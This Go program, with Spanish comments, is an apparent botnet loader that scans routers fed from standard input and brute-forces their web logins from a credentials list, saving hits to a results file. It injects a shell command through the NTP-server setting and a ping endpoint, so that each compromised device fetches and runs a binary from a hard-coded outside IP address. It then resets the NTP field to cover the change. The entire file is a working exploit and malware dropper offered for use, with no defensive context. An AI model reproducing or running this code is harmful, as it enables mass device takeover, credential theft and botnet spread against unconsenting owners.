package main

import (
	"fmt"
	"strings"
	"net"
	"bufio"
	"os"
	"sync"
	"time"
	"io/ioutil"
	"unicode"
	"encoding/base64"
)

var syncWait sync.WaitGroup
var totalFound, totalAuthed, totalVuln int

var execPayload string = "wget%20http://64.176.15.189:1283/bins/mipsel%20-O%20/tmp/bot%3Bchmod%20%2Bx%20/tmp/bot%3B/tmp/bot%20%26"
var execTrigger string = "ps|grep -|sh"
var httpLogins []string
var loginsLen int

var resultadosFile *os.File
var currentPort string

func isASCII(s string) bool {
    for i := 0; i < len(s); i++ {
        if s[i] > unicode.MaxASCII {
            return false
        }
    }
    return true
}

func deviceRunPing(target string, auth string, session string, ping string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	
	conn.Write([]byte("GET /pingHost.cmd?action=add&targetHostAddress=" + ping + "&sessionKey=" + session + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nConnection: close\r\n\r\n"))
	
	for {
		bytebuf := make([]byte, 256)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			return false
		}
		if strings.Contains(string(bytebuf), "COMPLETED") {
			return true
		}
	}
	return false
}

func deviceLoadNtp(target string, auth string, session string, ntp string) bool {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	
	conn.Write([]byte("GET /sntpcfg.cgi?ntp_enabled=1&ntpServer1=" + ntp + "&sessionKey=" + session + " HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nConnection: close\r\n\r\n"))
	
	bytebuf := make([]byte, 256)
	rdlen, err := conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return false
	}
	return true
}

func deviceContainsVuln(target string, auth string) string {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return ""
	}
	defer conn.Close()
	
	conn.Write([]byte("GET /ping.html HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nConnection: close\r\n\r\n"))
	
	for {
		bytebuf := make([]byte, 1024)
		rdlen, err := conn.Read(bytebuf)
		if err != nil || rdlen <= 0 {
			return ""
		}
			
		if strings.Contains(string(bytebuf), "sessionKey=") {
			idx := strings.Index(string(bytebuf), "sessionKey=")
			if idx > 0 {
				end := strings.Index(string(bytebuf)[idx:], "&")
				if end == -1 {
					end = strings.Index(string(bytebuf)[idx:], "'")
				}
				if end > 0 {
					sessionKey := string(bytebuf)[idx+11 : idx+end]
					if isASCII(sessionKey) && len(sessionKey) > 0 {
						return sessionKey
					}
				}
			}
		}
	}
	return ""
}

func deviceAuthentication(target string) string {
	for i := 0; i < loginsLen; i++ {
		if httpLogins[i] == "" {
			continue
		}
		conn, err := net.DialTimeout("tcp", target, 5*time.Second)
		if err != nil {
			continue
		}
		
		b64Auth := base64.StdEncoding.EncodeToString([]byte(httpLogins[i]))
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nAuthorization: Basic " + b64Auth + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\nConnection: close\r\n\r\n"))
		
		bytebuf := make([]byte, 512)
		rdlen, err := conn.Read(bytebuf)
		conn.Close()
		
		if err != nil || rdlen <= 0 {
			continue
		}
		
		resp := string(bytebuf)
		if strings.Contains(resp, "HTTP/1.1 200") || strings.Contains(resp, "HTTP/1.0 200") {
			totalAuthed++
			
			// Guardar en archivo
			parts := strings.Split(httpLogins[i], ":")
			if len(parts) == 2 {
				line := fmt.Sprintf("%s:%s:%s:%s\n", target, currentPort, parts[0], parts[1])
				resultadosFile.WriteString(line)
				resultadosFile.Sync()
			}
			
			// SOLO MUESTRA ESTO CUANDO ENCUENTRA CREDENCIALES
			fmt.Printf("\n[!] %s | %s:%s\n", target, parts[0], parts[1])
			return b64Auth
		}
		time.Sleep(500 * time.Millisecond)
	}
	return ""
}

func deviceVerification(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 5*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	
	conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
	
	bytebuf := make([]byte, 512)
	rdlen, err := conn.Read(bytebuf)
	if err != nil || rdlen <= 0 {
		return false
	}
	
	resp := string(bytebuf)
	if strings.Contains(resp, "401 Unauthorized") || strings.Contains(resp, "Authorization Required") {
		totalFound++
		return true
	}
	return false
}

func loaderFunc(target string) {
	defer syncWait.Done()
	
	if deviceVerification(target) == false {
		return
	}
	
	auth := deviceAuthentication(target)
	if auth == "" {
		return
	}
	
	session := deviceContainsVuln(target, auth)
	if session == "" {
		return
	}
	
	if deviceLoadNtp(target, auth, session, execPayload) == false {
		return
	}
	
	if deviceRunPing(target, auth, session, ";ps|sh") == false {
		return
	}
	
	if deviceLoadNtp(target, auth, session, "time.nist.gov") == false {
		return
	}
	
	totalVuln++
	
	// Guardar despliegue exitoso
	line := fmt.Sprintf("DEPLOYED:%s:%s\n", target, currentPort)
	resultadosFile.WriteString(line)
	resultadosFile.Sync()
	
	// SOLO MUESTRA ESTO CUANDO DESPLIEGA
	fmt.Printf("[+] DEPLOYED: %s\n", target)
	return
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Uso: ./cisco <puerto>")
		return
	}
	currentPort = os.Args[1]
	
	var err error
	resultadosFile, err = os.Create("resultados.txt")
	if err != nil {
		fmt.Println("Error creando archivo resultados.txt")
		return
	}
	defer resultadosFile.Close()
	
	resultadosFile.WriteString("# RESULTADOS DEL ESCANEO\n")
	resultadosFile.WriteString(fmt.Sprintf("# Fecha: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	resultadosFile.WriteString("# Formato: IP:PUERTO:USUARIO:CONTRASEÑA\n\n")
	
	content, err := ioutil.ReadFile("logins.txt")
	if err != nil {
		fmt.Println("Error: logins.txt not found")
		return
	}
	
	httpLogins = strings.Split(string(content), "\n")
	loginsLen = len(httpLogins)
	
	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			syncWait.Add(1)
			go loaderFunc(scan.Text() + ":" + os.Args[1])
		}
	}
}
